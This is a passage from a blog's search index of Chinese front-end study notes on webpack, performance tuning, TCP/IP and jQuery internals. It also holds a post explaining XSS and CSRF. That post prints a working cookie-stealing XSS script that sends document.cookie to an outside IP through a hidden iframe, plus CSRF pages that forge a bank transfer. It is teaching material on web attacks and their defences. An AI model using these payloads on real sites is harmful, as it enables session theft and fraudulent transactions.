/\.scss/, include: path.resolve(__dirname,'src'), exclude: /node_modules/, use: [&#123; loader: MiniCssExtractPlugin.loader, &#125;,'css-loader','sass-loader']&#125;, 处理CSS3属性前缀为了浏览器的兼容性，有时候我们必须要加入浏览器内核的前缀。目前主流浏览器的内核如下 Trident内核：主要代表为IE浏览器, 前缀为-ms Gecko内核：主要代表为Firefox, 前缀为-moz Presto内核：主要代表为Opera, 前缀为-o Webkit内核：产要代表为Chrome和Safari, 前缀为-webkit 安装依赖 npm install postcss-loader autoprefixer -D postcss-loader index.css123::placeholder &#123; color: red;&#125; 配置webpack.config.css123module.exports=&#123; plugins:[require('autoprefixer')]&#125; 配置webpack.config.js123456&#123; test:/\.css$/, use:[MiniCssExtractPlugin.loader,'css-loader','postcss-loader'], include:path.join(__dirname,'./src'), exclude:/node_modules/&#125; 转义ES6/ES7/JSXBabel其实死一个编译JavaScript的平台，可以把ES6/ES7,React的JSX转义为ES5 安装依赖 npm install babel-core babel-loader babel-preset-env babel-preset-stage-0 babel-preset-react babel-plugin-transform-decorators-legacy -D 报错:123456npm ERR! code ENOENTnpm ERR! errno -4058npm ERR! syscall accessnpm ERR! enoent ENOENT: no such file or directory, access npm ERR! enoent This is related to npm not being able to find a file.npm ERR! enoent 尝试解决办法，切换cnpm安装，我成功了 decorator1234567891011//Option+Shift+Afunction readonly(target,key,discriptor) &#123; discriptor.writable=false;&#125;class Person&#123; @readonly PI=3.14;&#125;let p1=new Person();p1.PI=3.15;console.log(p1) 配置jsconfig.json12345&#123; "compilerOptions": &#123; "experimentalDecorators": true &#125;&#125; webpack.config.js123456789101112&#123; test: /\.jsx?$/, use: &#123; loader: 'babel-loader', options: &#123; presets: ["env","stage-0","react"], plugins:["transform-decorators-legacy"] &#125; &#125;, include: path.join(__dirname,'src'), exclude:/node_modules/&#125; 如何调试打包后的代码webpack通过配置可以自动给我们source maps文件，map文件是一种对应编译文件和源文件的方法 source-map 把映射文件生成到单独的文件，最完整最慢 cheap-module-source-map 在一个单独的文件中产生一个不带列映射的Map eval-source-map使用eval打包源文件模块,在同一个文件中生成完整sourcemap cheap-module-eval-source-map sourcemap和打包后的JS同行显示，没有映射列 devtool:’eval-source-map’ 打包第三方类库]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端开发常用的优化技巧汇总]]></title>
    <url>%2F2018%2F08%2F15%2Fweb%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[本文总阅读量次对于一个前端工程师，不仅要写好代码，还要考虑到性能方面的优化问题，那么我们可以从哪些方面进行性能的优化？首先，我们先来看看“雅虎军规”的35条： “雅虎军规”35条 尽量减少 HTTP 请求个数——须权衡 使用 CDN（内容分发网络） 为文件头指定 Expires 或 Cache-Control ，使内容具有缓存性。 避免空的 src 和 href 使用 gzip 压缩内容 把 CSS 放到顶部 把 JS 放到底部 避免使用 CSS 表达式 将 CSS 和 JS 放到外部文件中 减少 DNS 查找次数 精简 CSS 和 JS 避免跳转 剔除重复的 JS 和 CSS 配置 ETags 使 AJAX 可缓存 尽早刷新输出缓冲 使用 GET 来完成 AJAX 请求 延迟加载 预加载 减少 DOM 元素个数 根据域名划分页面内容 尽量减少 iframe 的个数 避免 404 减少 Cookie 的大小 使用无 cookie 的域 减少 DOM 访问 开发智能事件处理程序 用 代替 @import 避免使用滤镜 优化图像 优化 CSS Spirite 不要在 HTML 中缩放图像——须权衡 favicon.ico要小而且可缓存 保持单个内容小于25K 打包组件成复合文本 在性能优化方面，我们可以从三个方面来考虑减少http请求的次数或者减少请求数据的大小页面中每发送一次HTTP请求，都需要完成请求+响应这个完整的HTTP事务,会消耗一些时间，也可能会导致HTTP连接通道阻塞，为了提高页面加载速度和运行的性能，我们应该减少HTTP的请求次数和减少请求内容的大小(请求的内容越大，消耗的时间越长)1.采用CSS雪碧图技术(CSS Sprit/CSS图片精灵)技术，把一些小图合并在一张大图上,使用的时候通过背景图片定位,定位到具体的某一张小图上123456789.pubBg&#123; background:url('../img/sprit.png') no-repeat; background-size:x y /*=&gt;和原图大小保持一致的;*/&#125;.box&#123; background-position:x y;/*通过背景定位,定位到具体的位置，展示不同的图片即可*/&#125;....&lt;div class = 'pubBg box'&gt;&lt;/div&gt; 2、真实项目中，我们最好把CSS或者JS文件进行合并压缩；尤其是在移动端开发的时候，如果CSS或者JS文件内容不是很多，我们可以采取内嵌式，告别外链式，依次来减少HTTP请求次数，加快页面加载速度； 1)CSS合并成一个，JS最好也合并成一个 2)首先通过一些工具(例如：webpack)把合并后的CSS或者JS压缩成xxx.min.js，减少文件大小 3)服务器端开启资源文件的GZIP压缩… 通过一些自动化工具完成CSS以及JS的合并压缩，或者再完成LESS转CSS，ES6转ES5等操作，我们把这种自动化构建模式，称之为前端&quot;工程化&quot;开发 3、采用图片懒加载技术，在页面开始加载的时候，不请求真实的图片地址，而是用默认图占位，当页面加载完成后，再根据相关的条件依次记载真实图片(核心目是：减少页面首次加载HTTP请求的次数)真实项目中，我们开始图片都不加载，页面首次加载完成，先把第一屏中可以看见的图片进行加载，随着页面滚动，再把下面区域中能够呈现出来的图片进行加载 根据图片懒加载技术，我们还可以扩充出,数据的懒加载 1)开始加载页面的时候，我们只把首屏或者前两屏的数据从服务器端进行请求(有些网站首屏数据是后端渲染好，整体返回给客户端呈现的) 2)当页面下拉，滚动到哪个区域，再把这个区域需要的数据进行请求(请求回来做数据绑定以及图片延迟加载) 3)分页展示技术采用的也是数据的懒加载思想实现的：如果我们请求获取的数据是很多的数据，我们最好分批请求，开始只请求第一页的数据，当用户点击第二页(微博是下拉到一定的距离之后，再请求第二页数据…)的时候再请求第二页的数据… 4、对于不经常更新的数据，最好使用浏览器的304缓存做处理(主要由服务器端处理)例如：第一次请求CSS和JS下来，浏览器会把请求的内容缓存在了，如果做了304处理，用户再次请求CSS和JS，直接从缓存中读取，不需要再去服务器获取了(减少了HTTP请求次数)当用户强制刷新页面(CTRL+F5)或者当前缓存的CSS或JS发生了变动，都会重新的服务器端拉取… 对于客户端来讲，我们还可以基于localStorage来做一些本地存储，例如：第一次请求的数据或者不经常更新的CSS和JS，我们都可以把内容存储在本地，下一次页面加载，我们从本地中获取即可，我们设定一定的期限或者一些标识，可以控制在某个阶段重新从服务器获取 5、使用字体图标代替一些页面中的位图(图片)，这样不仅做适配的时候方便，而且更加轻量级，而且减少了HTTP请求次数(类似于图片雪碧图)6、如果当前页面中出现了AUDIO或者VIDEO标签，我们最好设置它们的preload=none;页面加载的时候，音视频资源不进行加载，播放的时候再开始加载(减少页面首次加载HTTP请求的次数) preload=auto;页面首次加载的时候就把音视频资源进行加载了 preload=metadata;页面首次加载的时候只把音视频资源的头部信息进行加载 7、在客户端和服务器端进行数据通信的时候，我们尽量采用JSON格式进行数据传输[优势]1）JSON格式的数据，能够清晰明了的展示出数据结构，而且也方便我们获取和操作2）相对于很早以前的XML格式传输，JSON格式的数据更加轻量级3）客户端和服务器端都支持JSON格式数据的处理，处理起来非常的方便真实项目中，并不是所有的数据都要基于JSON，我们尽可能这样做，但是对于某些特殊需求(例如：文件流的传输或者文档流的传输)，使用JSON就不合适了 8、采用CDN加速 CDN： 分布式(地域分布式)[很烧钱] 本质上：真正的性能优化是由硬件做依托的 关于编写代码时候的一些优化技巧除了减少HTTP请求次数和减少请求数据的大小可以优化性能，我们在编写代码的时候，也可以进行一些优化，让页面的性能有所提升(有些不好的代码编写习惯，会导致页面性能消耗太大，例如：内存泄露) 1、在编写JS代码的时候，尽量减少对DOM的操作(VUE和react框架在这方面处理的非常不错)在JS中操作DOM是一个非常消耗性能的事情，但是我们又不可避免的操作DOM，我们只能尽量减少对它的操作 [操作DOM的弊端] 1)DOM存在映射机制(JS中的DOM元素对象和页面中的DOM结构是存在映射机制的，一改则都改)，这种映射机制，是浏览器按照W3C标准完成对JS语言的构建和DOM的构建(其实就是构建了一个监听机制)，操作DOM是同时要修改两个地方，相对于一些其他的JS编程来说是消耗性能的 2)页面中的DOM结构改变或者样式改变，会触发浏览器的回流(浏览器会把DOM结构重新进行计算，这个操作很耗性能)和重绘(把一个元素的样式重新渲染) 2、编写代码的时候，更多的使用异步编程 同步编程会导致：上面东西完不成，下面任务也做不了，我们开发的时候，可以把某一区域模块都设置为异步编程，这样只要模块之间没有必然的先后顺序，都可以独立进行加载，不会受到上面模块的堵塞影响(用的不多) 尤其是ajax数据请求，我们一般都要使用异步编程，最好是基于promise设计模式进行管理(项目中经常使用fetch、VUE axios等插件来进行ajax请求处理，因为这些插件中就是基于promise设计模式对ajax进行的封装处理) 3、在真实项目中，我们尽可能避免一次性循环过多数据(因为循环操作是同步编程)，尤其是要避免while导致的死循环操作4、CSS选择器优化 1）尽量减少对标签选择器的使用 2）尽可能少使用ID选择器，多使用样式类选择器(通用性强) 3）减少使用选择器时候前面的前缀，例如：headerBox .nav .left a{}(选择器是从右向左查找的)、在命名的时候做优化。 5、避免使用CSS表达式1234/*CSS表达式*/.box&#123; background-color:expression((new Date()).getHours()%2?'red':'blue');&#125; 6、减少页面中的冗余代码，尽可能提高方法的重复使用率：”低耦合高内聚”7、最好CSS挡在head中，而JS放在body尾部，让页面加载的时候，先加载CSS，再加载JS(先呈现页面，再给用户提供操作)8、JS中避免使用eval 1）性能消耗大 2）代码压缩后，容易出现代码执行错乱问题 9、JS中尽量减少闭包的使用 1）闭包会形成一个不销毁的栈内存，过多的栈内存累积会影响页面的性能 2）还会容易导致内存的泄露 闭包也有自己的优势：保存和保护，我们只能尽量减少，但是无可避免 10、在做DOM事件绑定的时候，尽量避免一个个的事件绑定，而是采用性能更高的事件委托来实现事件委托(事件代理) 把事件绑定给外层，当里面的后代元素相关行为被触发，外层容器绑定的方法也会被触发执行(冒泡传播机制导致)，通过事件源是谁，我们做不同的操作即可 11、尽量使用CSS3动画代替JS动画，因为CSS3的动画或者变形都开启了硬件加速，性能比JS动画好12、编写JS代码的时候尽可能使用设计模式来构建体系，方便后期的维护，也提高了扩充性等13、CSS中减少对滤镜的使用，页面中也减少对flash的使用关于页面SEO优化技巧1、页面中杜绝出现死链接(404页面)，而且对于用户输入一个错误页面，我们要引导到404提示页面中(服务器处理的)2、避免浏览器中异常错误的抛出 尽可能避免代码出错 使用try catch做异常信息的捕获 … 3、增加页面关键词优化]]></content>
      <tags>
        <tag>web前端</tag>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP、http等知识梳理]]></title>
    <url>%2F2018%2F08%2F15%2FTCP-IP%E3%80%81http%E7%AD%89%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"><![CDATA[本文总阅读量次 前后端通信先从一道面试题开始：在面试的时候经常被问，当我们在浏览器地址栏中输入一个URL地址,到最后看到页面,中间都经历了哪些事情?我们从客户端和服务器交互模型角度来回答这个问题：假设我们访问的是 https://www.baidu.com/这个地址 ，回车键之后，我们可以看到的百度页面 百度页面并没用在我们自己的客户端本地，我们输入地址之后，才请求过来的 输入不同的域名可以看到不同的页面 有的网址是https:,有的是http(也有ftp) 需要客户端联网才能完成这些事情那这一过程都经历了什么事情呢？request请求阶段 首先根据客户端输入的域名，到DNS服务器上进行反解析(通过域名找到对应服务器的外网IP) 通过找到的外网IP，找到对应的服务器 通过在地址栏中输入的端口号(没有输入时因为不同协议有自己默认的端口号)找到服务器上发布的对应的项目response响应阶段 真正的服务器接收到响应，根据你的请求信息，进行资源的整理；并且把相应的资源通过HTTP返给客户端；(html,css，js返回的不是文件) 把从服务器请求过来的数据，资源进行整理；处理成浏览器可识别的文件；浏览器自主渲染的过程 先把HTML文件进行过滤解析，形成DOM树；节点与节点之间的一个组合 代码从上到下解析，形成CSS树； 把DOM树和css树进行重新组合，形成render树；是真正最后渲染的树； 我们上面说的协议，一般有HTTP、TCP、IP等那协议是什么呢？协议的必要性在哪？ 简单来说，协议就是计算机与计算机之间通过网络通信时，事先达成的一种 “约定”。这种“约定”使不同厂商的设备、不同的CPU以及不同操作系统组成的计算机之间，只要遵循相同的协议就能够实现通信。这就好比一个中国人说汉语一个外国人说英语使用不同的国家语言进行沟通，怎么也无法理解。如果两个人约定好 都说中文或英文，就可以互相沟通通信。协议分为很多种，每一种协议都明确界定了它的行为规范。两台计算机必须能够支持相同的协议，并遵循相同协议进行处理，这样才能实现相互通信。 TCP/IP协议TCP/IP 是用于因特网 (Internet) 的通信协议。 TCP/IP 通信协议是对计算机必须遵守的规则的描述，只有遵守这些规则，计算机之间才能进行通信。 TCP (Transmission Control Protocol)和UDP(User Datagram Protocol)协议属于传输层协议。其中TCP提供IP环境下的数据可靠传输，它提供的服务包括数据流传送、可靠性、有效流控、全双工操作和多路复 用。通过面向连接、端到端和可靠的数据包发送。通俗说，它是事先为所发送的数据开辟出连接好的通道，然后再进行数据发送；而UDP则不为IP提供可靠性、 流控或差错恢复功能。一般来说，TCP对应的是可靠性要求高的应用，而UDP对应的则是可靠性要求低、传输经济的应用。 TCP支持的应用协议主要有：Telnet、FTP、SMTP等； UDP支持的应用层协议主要有：NFS（网络文件系统）、SNMP（简单网络管理协议）、DNS（主域名称系统）、TFTP（通用文件传输协议）等。 TCP/IP协议与低层的数据链路层和物理层无关，这也是TCP/IP的重要特点TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接:三次握手的过程 第一次握手：客户端发送SYN码数据包发送给服务器，客户端要求和服务器建立连接 第二次握手：服务端接收到联机请求会发送ACK码到客户端，是要建立联机吗？ 第三次握手：客户端接收到服务端的ACK码，验证是否正确，如果正确，则再次发送ACK，建立连接 三次握手之后，客户端和服务端联机成功，可以发送数据一个TCP连接必须要经过三次“对话”才能建立起来，其中的过程非常复杂，只简单的 描述下这三次对话的简单过程：主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；主机B向主机A发送同意连接和要求同步 （同步就是两台主机一个在发送，一个在接收，协调工作）的数据包：“可以，你什么时候发？”，这是第二次对话；主机A再发出一个数据包确认主机B的要求同 步：“我现在就发，你接着吧！”，这是第三次对话。三次“对话”的目的是使数据包的发送和接收同步，经过三次“对话”之后，主机A才向主机B正式发送数 据。客户端和服务端发送数据是双向的；客户端给服务端传递的是路径、参数，随机的；服务端给客户端传输自己的资源，文件，数据；四次挥手的过程 1.当客户端发送数据结束，需要发送fin告诉服务器，数据传输结束； 2.服务端返回给客户端一个ACK码，知道客户端数据传输完毕；客户端接收到ACK，就会把发送到服务端的通道进行关闭； 3.服务端数据传输结束之后，也会发送fin给客户端 4.当客户端接收数据完毕之后，会发送ACK给服务端，服务端可以安心关闭传输数据的通道。当客户A 没有东西要发送时就要释放 A 这边的连接，A会发送一个报文（没有数据），其中 FIN 设置为1, 服务器B收到后会给应用程序一个信，这时A那边的连接已经关闭，即A不再发送信息（但仍可接收信息）。 A收到B的确认后进入等待状态，等待B请求释放连接， B数据发送完成后就向A请求连接释放，也是用FIN=1 表示， 并且用 ack = u+1(如图）， A收到后回复一个确认信息，并进入 TIME_WAIT 状态， 等待 2MSL 时间。为什么需要等待呢？为了这种情况： B向A发送 FIN = 1 的释放连接请求，但这个报文丢失了， A没有接到不会发送确认信息， B 超时会重传，这时A在 WAIT_TIME 还能够接收到这个请求，这时再回复一个确认就行了。（A收到 FIN = 1 的请求后 WAIT_TIME会重新记时）另外服务器B存在一个保活状态，即如果A突然故障死机了，那B那边的连接资源什么时候能释放呢？ 就是保活时间到了后，B会发送探测信息， 以决定是否释放连接为什么握手是三次，挥手是四次的呢？ 因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。]]></content>
      <tags>
        <tag>http、TCP/IP</tag>
        <tag>前后端通信</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery源码解读2]]></title>
    <url>%2F2018%2F08%2F14%2FjQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB2%2F</url>
    <content type="text"><![CDATA[本文总阅读量次 构造jQuery对象 jQuery对象是一个类数组对象，含有连续的整形属性、length属性和大量的jQuery方法。jQuery对象右构造函数jQuery创建，$()是jQuery()的缩写 构造函数jQuery 调用构造函数时传入的参数不同，创建jQuery对象的逻辑也会随之不同，构造函数有7种用法； jQuery(selector[,context]) 这个函数接收一个包含CSS选择器的字符串，然后用这个字符串去匹配一组元素。jQuery 的核心功能都是通过这个函数实现的。jQuery中的一切都基于这个函数，或者说都是在以某种方式使用这个函数。这个函数最基本的用法就是向它传递一个表达式（通常由CSS选择器组成），然后根据这个表达式来查找所有匹配的元素。默认情况下,如果没有指定context参数，$()将在当前的 HTML document中查找 DOM 元素；如果指定了 context 参数，如一个 DOM 元素集或 jQuery 对象，那就会在这个 context 中查找。在jQuery 1.3.2以后，其返回的元素顺序等同于在context中出现的先后顺序。 jQuery(html,[ownerDocument]) 根据提供的原始 HTML 标记字符串，动态创建由 jQuery 对象包装的 DOM 元素。同时设置一系列的属性、事件等。 你可以传递一个手写的HTML字符串，或者由某些模板引擎或插件创建的字符串，也可以是通过 AJAX 加载过来的字符串。但是在你创建 input 元素的时会有限制。当然这个字符串可以包含斜杠(比如一个图像地址)，还有反斜杠。当你创建单个元素时，请使用闭合标签或XHTML格式。例如，创建一个 span ，可以用$(““) 或 $(““) ，但不推荐 $(““)。在jQuery中，这个语法等同于$(document.createElement(“span”)) 。 jQuery(element)、(elementArray) 如果传入一个DOM元素或者一个DOM元素数组，则将DOM元素封装成jQuery对象并返回，那么这个DOM元素就变成了jQuery对象，可以调用jQuery上的方法。比如：在监听函数中，或者在事件中的this,$(this)之后，这个this就由原生的对象变成jQuery对象，就可以调用jQuery上的方法，比如sideUp、slideDown…123$("#box").click(function()&#123;$(this).slideUp();&#125;) jQuery(Object) 传入一个普通的JavaScript对象，jQuery就会把这个JavaScript对象包装成jQuery对象并返回，方便在对象上绑定事件和方法 jQuery(callback) 如果传入一个函数，则在document上绑定一个ready事件监听函数，ready事件的监听函数的触发要早于onload事件，ready事件的触发是在DOM结构加载完成时触发，而onload事件是在所有资源加载完成时触发。 jQuery(jQuery Object)如果传入的是一个jQuery对象，则重新拷贝一份，将拷贝副本返回，这个副本跟原来的jQuery对象的用法是一样的，都可以调用jQuery上的方法。他们引用的是完全相同的DOM元素 jQuery() 如果不传入任何东西，则返回的是一个空的jQuery对象，它的length属性是0]]></content>
      <tags>
        <tag>jQuery源码解读</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery源码解读1]]></title>
    <url>%2F2018%2F08%2F14%2FjQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB1%2F</url>
    <content type="text"><![CDATA[本文总阅读量次 jQuery源码解读1一万多行的jQuery源码着实让我恐惧，但是jQuery是一个优秀的JavaScript类库，里面封装的方法，jQuery源码里面把函数的三种身份变现的淋漓尽致、原型链、各种设计思想、让人不禁感叹编程之美。抱着提高编程能力和编程思想的目的，我把源码的注释删掉之后又鼓起勇气重新来看。边看边做下笔记。先对jQuery做一下小的介绍：首先，jQuery是一个优秀的JavaScript类库：它提供了一些常用的方法，我们在开发项目的时候，随时可以引入这些类库，实现我们的业务需求。常用类库：jQuery(常用于PC端)，zepto(常用于移动端)。相比于其他的类似UI组件、插件、框架有一定的不同点。 UI组件：UI组件：通过html css js组成，我们使用的时候，直接引入就可以了，常用的UI组件：bootstrap antDesign 插件：带有一定的业务逻辑。比如说选项卡插件，轮播图插件；我们在项目开发的时候，重复的业务可以用插件来替代；比如说常用的插件：swiper iscroll Echarts; 框架：它具有一定的编程思想，我们开发的时候需要按照它提供的编程思想进行开发，它提供了相对应的ui组件和功能插件，常用的框架有：React Vue Augular Backbone1234567891011121314151617181920(function( global, factory ) &#123; if ( typeof module === "object" &amp;&amp; typeof module.exports === "object" ) &#123; module.exports = global.document ? factory( global, true ) : function( w ) &#123; if ( !w.document ) &#123; throw new Error( "jQuery requires a window with a document" ); &#125; return factory( w ); &#125;; &#125; else &#123; factory( global ); &#125;&#125;(typeof window !== "undefined" ? window : this, function( window, noGlobal ) &#123;....if ( typeof noGlobal === strundefined ) &#123; window.jQuery = window.$ = jQuery; &#125; return jQuery;&#125;)); 自调用匿名函数” 首先，源码一开始采用了闭包的方法，将代码放在了一个自执行函数中，这种方法称之为“自调用匿名函数”，当浏览器加载完成jQuery文件之后，就会立即执行该函数，初始化各个模块。 为什么需要自调用匿名函数呢？ 通过自调用匿名函数创建了一个特殊的作用域，保护里面的私有变量不受外界干扰，避免了全局变量污染的问题。由于jQuery会被应用在成千上万的代码中，为了防止命令以及变量的冲突，自调用函数的设计就防止了与外界变量的冲突。那么，外界需要用到jQuery对象的话，应该怎么办呢？jQuery提供了一个出口，将jQuery对象暴露在全局对象window下,window.jQuery = window.$ = jQuery;也就是说，在外界只要执行jQuery或者$就可以使用jQuery对象封装的方法了。 为什么自调用匿名函数需要传入window/global？和工厂函数？ 因为在浏览器端的全局对象是window，如果程序跑在服务端的node环境下，全局变量是global，将全局变量作为参数传递进去时，jQuery对象就可以更快的访问到全局对象，另外，全局对象作为参数传递进去的时候，可以在代码压缩的时候进行优化; 自调用匿名函数前后不能省略分号 如果没有给自调用匿名函数的末尾加上分号，那么下一个匿名函数的第一个括号会被当做函数来执行。比如123(function()&#123;&#125;)()(function()&#123;&#125;)()//undefined is not a function]]></content>
      <categories>
        <category>jQuery</category>
        <category>源码</category>
      </categories>
      <tags>
        <tag>jQuery源码解读</tag>
        <tag>jQuery@1.11.3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS中常用的设计模式]]></title>
    <url>%2F2018%2F08%2F13%2FJS%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[本文总阅读量次]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全之XSS和CSRF]]></title>
    <url>%2F2018%2F08%2F11%2FWeb%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E5%92%8CCSRF%2F</url>
    <content type="text"><![CDATA[本文总阅读量次今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧! Web安全之XSS和CSRFXSSXSS定义跨站脚本攻击，通过客户端脚本语言在一个论坛发帖(其他input类型的输入框也可以)中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫XSS！ XSS跨站脚本攻击 Cross site Scipting主要原因是多数用户的输入没有被转义，而直接执行。XSS可以获取到用户cookie或隐私客户端信息。 比如通过location.hash假设某个网站有一段脚本1$("#box").html(location.hash.replace('#','')); 攻击者看到伪造URL1location.href = "http://a.com?"+document.cookie;获取用户cookie! 也就是说它利用了网站的某个漏洞，然后把脚本注入该网页，让其他登录的用户登录后就会把该用户的信息获取到并发送给一个恶意的服务器。把压缩后的url发给某个登录的用户 一个网页的评论有漏洞(没有转义)12345678910111213141516&lt;script type="text/javascript"&gt;(function(window, document) &#123; // 构造泄露信息用的 URL var cookies = document.cookie; var xssURIBase = "http://192.168.123.123/myxss/"; var xssURI = xssURIBase + window.encodeURI(cookies); // 建立隐藏 iframe 用于通讯 var hideFrame = document.createElement("iframe"); hideFrame.height = 0; hideFrame.width = 0; hideFrame.style.display = "none"; hideFrame.src = xssURI; // 开工 document.body.appendChild(hideFrame);&#125;)(window, document);&lt;/script&gt; 那么这段代码就会被执行，这个代码会携带着登录用户的信息传输给http://192.168.123.123/myxss/ 服务器，然后服务器的代码就会接收了用户的隐式信息!主要原理就是注入脚本到安全漏洞，然后发送给另外一个站点 解决防范我们不需要用户输入HTML也是输入纯文本，转义是个很好的方法。可以用白名单重复处理。用户输入的HTML可能有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别 CSRF：cross-site Request Forgery跨站请求伪造：冒充用户发起请求，完成一些违背用户真实意愿的请求~ CSRF可以做什么你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 CSRF原理图 XSS和CSRF的关系 CSRF更加强调一种形式，只要是伪造用户发起的请求都是CSRF攻击，而XSS更加强调是一种手段。 CSRF可以是XSS实现，也可以是其他形式来伪造请求，只要是伪造了请求即CSRF。完成CSRF需要两个步骤： 1.登陆受信任的网站A，在本地生成 COOKIE 2.在不登出A的情况下，或者本地 COOKIE 没有过期的情况下，访问危险网站B。(也有可能B要求访问A网站) CSRF不需要知道sessionid就能让用户中招。 原理CSRF在另一个网站构造一个表单提交，提交地址是a1&lt;form id='test' method='POST' action="http://a.com/guestbook"/ &gt; 攻击者只要引导登录a的用户访问这个b网站，自动提交一个留言，这个提交到a网站的过程中，浏览器会将用户的cookie发送到服务器。 三种攻击模式假设B网站有一段HTML代码1&lt;img src=http://www.bank.com/Transfer.php?BankId=1122&amp;money=1000&gt; 在你登录A网站的时候，会先获取资源，同时留下你的cooki。然后当你再去访问B网站的时候，B会通过img的src属性隐式发送请求给A网站，达到模拟你发送请求的目的，来获取你的资源以及信息。 使用POST来完成敏感操作（更新数据）12345&lt;form action="Transfer.php" method="POST"&gt; &lt;p&gt;BankId: &lt;input type="text" name="toBankId" /&gt;&lt;/p&gt; &lt;p&gt;Money: &lt;input type="text" name="money" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type="submit" value="Transfer" /&gt;&lt;/p&gt; &lt;/form&gt; 危险网站B，可以通过后台使用REQUEST去获取请求的数据，而_REQUEST既可以获取get请求的数据也可以获取post请求的数据 node.js在node.js中，可以处理post请求的URL后面参数部分12eq.body.username;//处理请求体request bodyreq.query.username;//处理查询字符串 只使用POST请求，只处理POST请求体的数据危险网站B将代码修改1234567891011121314151617181920&lt;html&gt; &lt;head&gt; &lt;script type="text/javascript"&gt; function steal() &#123; iframe = document.frames["steal"]; iframe.document.Submit("transfer"); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload="steal()"&gt; &lt;iframe name="steal" display="none"&gt; &lt;form method="POST" name="transfer" action="http://www.Bank.com/Transfer.php"&gt; &lt;input type="hidden" name="BankId" value="11"&gt; &lt;input type="hidden" name="money" value="1000"&gt; &lt;/form&gt; &lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; B网站创建了一个iframe标签，并且把它设置为display:none，隐藏表单属性，偷偷给网站A发送请求，提前把表单提交值设设置好，提交给A网站 源于web的身份验证机制CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！ 防御机制服务端进行CSRF防御在客户端页面增加随机数。Cookie Hashing，就是构造加密的cookie信息。由于攻击者无法获取第三方cookie，那么表单的数据就构造失败。它不知道提交什么给服务器在表单里增加Hash值，在服务端验证123456&lt;form method=”POST” action=”transfer.php”&gt; &lt;input type=”text” name=”BankId”&gt; &lt;input type=”text” name=”money”&gt; &lt;input type=”hidden” name=”hash” value=”&lt;?=$hash;?&gt;”&gt; &lt;input type=”submit” name=”submit” value=”Submit”&gt; &lt;/form&gt; 验证码每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，这个方案可以完全解决CSRF，但在易用性方面似乎不是太好。 token首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。利用Token，嵌入到session中，当进行登录操作的时候就生成这个token，也就是说每次表单被渲染的时候，后台就会生成一个伪随机值来覆盖以前的伪随机值：用户只能成功提交他最后打开的表单，因为所有其他的表单都有非法的伪随机值。请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。 令牌在不同页面最好是不同的使用全局的token可能会导致破解难度下降，因为令牌方法理论上是可破解的， 配合验证码 无论是验证码还是令牌，验证通过一定要销毁]]></content>
      <tags>
        <tag>web安全</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F08%2F10%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
